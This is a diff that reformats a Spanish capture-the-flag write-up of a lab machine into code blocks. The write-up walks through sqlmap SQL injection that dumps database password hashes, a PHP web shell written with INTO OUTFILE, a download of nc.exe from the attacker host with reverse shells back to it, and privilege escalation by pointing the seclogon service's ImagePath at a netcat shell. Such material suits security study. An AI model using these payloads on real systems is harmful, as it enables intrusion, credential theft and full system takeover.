@@ -99,7 +99,13 @@ Al navegar al script se pueden identificar rutas que pudieran formar parte de un
 
 ![Código de functions.js](images/enum_3.png)
 
-Al identificar la composición de la petición e interactuar con `view_products.php` haciendo uso de `curl -i http://10.10.10.167/view_product.php -X POST -F "productId=1"`, se puede observar una tabla en html permitiendo la suposición de que se desplegarían en este sitio los atributos del producto en cuestión.
+Al identificar la composición de la petición e interactuar con `view_products.php` haciendo uso de:
+
+```bash
+curl -i http://10.10.10.167/view_product.php -X POST -F "productId=1"
+```
+
+Se puede observar una tabla en html permitiendo la suposición de que se desplegarían en este sitio los atributos del producto en cuestión.
 
 ![Vista inicial de producto](images/enum_4.png)
 
@@ -109,7 +115,11 @@ Después de varias iteraciones, buscando un identificador válido (26) se puede 
 
 #### ffuf
 
-Para complementar lo obtenido se buscaron rutas adicionales por medio de `ffuf -c -ic -u http://10.10.10.167/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.bak,.php,.html`.
+Para complementar lo obtenido se buscaron rutas adicionales por medio de:
+
+```bash
+ffuf -c -ic -u http://10.10.10.167/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.bak,.php,.html
+```
 
 ![Rutas adicionales encontradas](images/enum_6.png)
 
@@ -119,13 +129,25 @@ Para complementar lo obtenido se buscaron rutas adicionales por medio de `ffuf -
 
 ### Ejecución
 
-Teniendo en cuenta la tecnología empleada y parte de los parámetros usados, se buscó explotar una inyección SQL haciendo uso de `sqlmap`, utilizando `sqlmap -u "http://10.10.10.167/view_product.php" --data="productId=1" --dbs` obteniendo de esta forma payloads válidos y la capacidad de obtener los registros de la base de datos.
+Teniendo en cuenta la tecnología empleada y parte de los parámetros usados, se buscó explotar una inyección SQL haciendo uso de `sqlmap`, utilizando:
+
+```bash
+sqlmap -u "http://10.10.10.167/view_product.php" --data="productId=1" --dbs
+```
+
+Obteniendo de esta forma payloads válidos y la capacidad de obtener los registros de la base de datos.
 
 - Payload: `productId=1 UNION ALL SELECT <query>-- -`
 
 ![Inyección con sqlmap](images/exploit_1.png)
 
-Después no encontrar información relevante respecto a la aplicación web, se buscó obtener información respecto a los usuarios de la base de datos, mediante `sqlmap -u "http://10.10.10.167/view_product.php" --data="productId=1" -D mysql -T user --passwords` obteniendo así sus hashes.
+Después no encontrar información relevante respecto a la aplicación web, se buscó obtener información respecto a los usuarios de la base de datos, mediante:
+
+```bash
+sqlmap -u "http://10.10.10.167/view_product.php" --data="productId=1" -D mysql -T user --passwords
+```
+
+Obteniendo así sus hashes.
 
 ![Hashes de usuarios de base de datos](images/exploit_2.png)
 
@@ -150,7 +172,13 @@ Después de obtener las credenciales y buscar emplearlas con los servicios expue
 
 Para lograrlo fue necesario identificar el directorio en el que se encuentra la instalación, de acuerdo al [enlace encontrado](https://docs.microsoft.com/en-us/previous-versions/office/developer/sharepoint-2010/ms474356(v=office.14)) se indica que por predeterminado la ruta suele ser `c:\inetpub\wwwroot`, permitiendo de esta forma complementar hacia dónde debería dirigirse la escritura del script.
 
-Después de probar con diferentes payloads respecto al escape de las barras (`\`), dado que la respuesta del servidor es identificada como un `500 Internal Server Error`, se realizó una prueba de la escritura mediante `curl -i http://10.10.10.167/view_product.php -X POST -F "productId=26 UNION ALL SELECT 'Hello world' INTO OUTFILE 'c:\\\\\\\\inetpub\\\\wwwroot\\\\test.txt'-- -"` logrando escribir satisfactoriamente al archivo indicado.
+Después de probar con diferentes payloads respecto al escape de las barras (`\`), dado que la respuesta del servidor es identificada como un `500 Internal Server Error`, se realizó una prueba de la escritura mediante:
+
+```bash
+curl -i http://10.10.10.167/view_product.php -X POST -F "productId=26 UNION ALL SELECT 'Hello world' INTO OUTFILE 'c:\\\\\\\\inetpub\\\\wwwroot\\\\test.txt'-- -"
+```
+
+Logrando escribir satisfactoriamente al archivo indicado.
 
 ***En este punto es importante recalcar para futuros escenarios similares que no siempre es verdad que porque la respuesta del servidor sea 500, significa que no se esté ejecutando el payload indicado.***
 
@@ -160,11 +188,29 @@ Visualizandolo en el servidor.
 
 ![Visualización en navegador](images/exploit_6.png)
 
-Permitiendo de esta manera cambiar el payload a `curl -i http://10.10.10.167/view_product.php -X POST -F 'productId=26 UNION ALL SELECT "<?php system($_GET[\"cmd\"])?>" INTO OUTFILE "c:\\\\\\\\inetpub\\\\wwwroot\\\\srrequiem.php"-- -'` logrando así tener un script listo para ejecutar comandos en la máquina.
+Permitiendo de esta manera cambiar el payload a 
+
+```bash
+curl -i http://10.10.10.167/view_product.php -X POST -F 'productId=26 UNION ALL SELECT "<?php system($_GET[\"cmd\"])?>" INTO OUTFILE "c:\\\\\\\\inetpub\\\\wwwroot\\\\srrequiem.php"-- -'
+```
+
+Logrando así tener un script listo para ejecutar comandos en la máquina.
 
 ![Webshell](images/exploit_7.png)
 
-Por lo que se estableció una reverse shell haciendo uso del binario `nc.exe`, subiéndolo a la máquina mediante `http://10.10.10.167/srrequiem.php?cmd=powershell.exe%20iwr%20http://10.10.14.16/nc.exe%20-outfile%20c:\windows\temp\nc.exe` montando previamente el servidor web donde se encuentra el binario a descargar. Para ejecutarlo posteriormente con `http://10.10.10.167/srrequiem.php?cmd=c:\windows\temp\nc.exe%20-e%20powershell.exe%2010.10.14.16%201234`, logrando así acceso de una manera más interactiva.
+Por lo que se estableció una reverse shell haciendo uso del binario `nc.exe`, subiéndolo a la máquina mediante la request:
+
+```text
+http://10.10.10.167/srrequiem.php?cmd=powershell.exe%20iwr%20http://10.10.14.16/nc.exe%20-outfile%20c:\windows\temp\nc.exe
+```
+
+Montando previamente el servidor web donde se encuentra el binario a descargar. Para ejecutarlo posteriormente con:
+
+```text
+http://10.10.10.167/srrequiem.php?cmd=c:\windows\temp\nc.exe%20-e%20powershell.exe%2010.10.14.16%201234
+```
+
+Logrando así acceso de una manera más interactiva.
 
 ![Reverse shell](images/exploit_8.png)
 
@@ -186,7 +232,16 @@ Habiendo identificado que existe el usuario `hector` en el sistema operativo por
 
 Habiendo encontrado [esta](https://lazyadmin.nl/powershell/start-process/) y [esta](https://davidhamann.de/2019/12/08/running-command-different-user-powershell/) referencias, se enviaron las siguientes instrucciones para lograr ejecutar comandos como el usuario `hector`.
 
-Previamente identificando el nombre de la máquina y/o hostname con `hostname`, `$env:COMPUTERNAME` o `[Environment]::MachineName`, según lo indica [este blog](https://adamtheautomator.com/powershell-get-computer-name/) para encontrar ese valor y usarlo posteriormente.
+Previamente identificando el nombre de la máquina y/o hostname con:
+
+```powershell
+# Cualquiera de los siguientes comandos
+hostname
+$env:COMPUTERNAME
+[Environment]::MachineName
+```
+
+Según lo indica [este blog](https://adamtheautomator.com/powershell-get-computer-name/) para encontrar ese valor y usarlo posteriormente.
 
 ![Nombre de máquina](images/post_2.png)
 
@@ -202,7 +257,19 @@ Logrando así ejecución como el usuario `hector`.
 
 ![Ejecución de comandos como hector](images/post_3.png)
 
-Dadas las limitaciones que se obtuvieron al ejecutar el mismo binario de `netcat` previamente subido debido a permisos, se decidió ejecutar el mismo binario con la diferencia de ejecutarlo a través de red, exponiendo el binario mediante `impacket-smbserver smbFolder $(pwd) -smb2support` y ejecutándolo con `Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { \\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 4321 }`. Obteniendo así una segunda revershell pero en esta ocasión como el usuario `hector`.
+Dadas las limitaciones que se obtuvieron al ejecutar el mismo binario de `netcat` previamente subido debido a permisos, se decidió ejecutar el mismo binario con la diferencia de ejecutarlo a través de red, exponiendo el binario mediante:
+
+```bash
+impacket-smbserver smbFolder $(pwd) -smb2support
+```
+
+Y ejecutándolo con:
+
+```powershell
+Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { \\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 4321 }
+```
+
+Obteniendo así una segunda revershell pero en esta ocasión como el usuario `hector`.
 
 ![Reverse shell como hector](images/post_4.png)
 
@@ -231,7 +298,13 @@ Trasladandolo a una lectura similar a la propiedad `sddl`, se puede ejecutar `cm
 
 ![Propiedad security convertida a sddl](images/post_8.png)
 
-Igualmente, el resultado no es entendible a menos que se busque alguna referencia para comparar, por lo que se puede hacer uso de `ConvertFrom-SDDLString -Sddl "D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"` para visualizarlo de mejor manera ya que se permite su conversión mediante powershell.
+Igualmente, el resultado no es entendible a menos que se busque alguna referencia para comparar, por lo que se puede hacer uso de:
+
+```powershell
+ConvertFrom-SDDLString -Sddl "D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
+```
+
+Para visualizarlo de mejor manera ya que se permite su conversión mediante powershell.
 
 ![Lectura de propiedad sddl](images/post_9.png)
 
@@ -262,17 +335,38 @@ Mediante powershell habría que:
 
 ![Valores de servicio a modificar](images/post_11.png)
 
-1. Asegurar encontrarse en la ruta de los registros (`cd HKLM:\system\currentcontrolset\services`).
-2. Obtener las propiedades del servicio querido (`get-item -path seclogon`).
+1. Asegurar encontrarse en la ruta de los registros:
+   
+   ```powershell
+   cd HKLM:\system\currentcontrolset\services
+   ```
+
+2. Obtener las propiedades del servicio requerido:
+   
+   ```powershell
+   get-item -path seclogon
+   ```
+
 3. Visualizar el valor a cambiar de `ImagePath`
 
 ![Modificaciones de servicio](images/post_12.png)
 
-1. Ejecutar `set-itemproperty seclogon -name imagepath -value "\\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 443"` para modificar los valores con los deseados.
-2. Obtener las propiedades del servicio querido `seclogon` para validar el cambio.
+1. Ejecutar (para modificar los valores con los deseados):
+   
+   ```powershell
+   set-itemproperty seclogon -name imagepath -value "\\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 443"
+   ```
+
+2. Obtener las propiedades del servicio requerido `seclogon` para validar el cambio.
 3. Visualizar el cambio realizado a `ImagePath`.
 
-El cual al montar la conexión de escucha, bastaría con iniciar el servicio con `start-service seclogon` para así ejecutar el binario indicado.
+El cual al montar la conexión de escucha, bastaría con iniciar el servicio con:
+
+```powershell
+start-service seclogon
+```
+
+Para así ejecutar el binario indicado.
 
 ![Reverse shell como nt authority\system](images/post_13.png)
 
@@ -280,9 +374,23 @@ El cual al montar la conexión de escucha, bastaría con iniciar el servicio con
 
 Mediante cmd se realizaría el mismo procedimiento con respectivos cambios en los comandos debido que powershell configura alias en algunos comandos, por lo que, se ejecutaría:
 
-1. `reg query HKLM\system\currentcontrolset\services\seclogon` para visualizar los valores del servicio.
-2. `reg add HKLM\system\currentcontrolset\services\seclogon /v ImagePath /t REG_EXPAND_SZ /d "\\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 443" /f` para cambiar los valores de la propiedad `ImagePath` de acuerdo a lo encontrado en [este blog](https://www.windowscentral.com/how-edit-registry-using-command-prompt-windows-10) para realizar los cambios e identificar el tipo de dato a cambiar `REG_EXPAND_SZ` para efectuarlo correctamente.
-3. `sc start seclogon` para iniciar el servicio.
+1. Para visualizar los valores del servicio:
+   
+   ```powershell
+   reg query HKLM\system\currentcontrolset\services\seclogon
+   ```
+
+2. Para cambiar los valores de la propiedad `ImagePath` de acuerdo a lo encontrado en [este blog](https://www.windowscentral.com/how-edit-registry-using-command-prompt-windows-10) para realizar los cambios e identificar el tipo de dato a cambiar `REG_EXPAND_SZ` para efectuarlo correctamente:
+   
+   ```powershell
+   reg add HKLM\system\currentcontrolset\services\seclogon /v ImagePath /t REG_EXPAND_SZ /d "\\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 443" /f
+   ```
+
+3. Para iniciar el servicio:
+   
+   ```powershell
+   sc start seclogon
+   ```
 
 # Notas adicionales
 
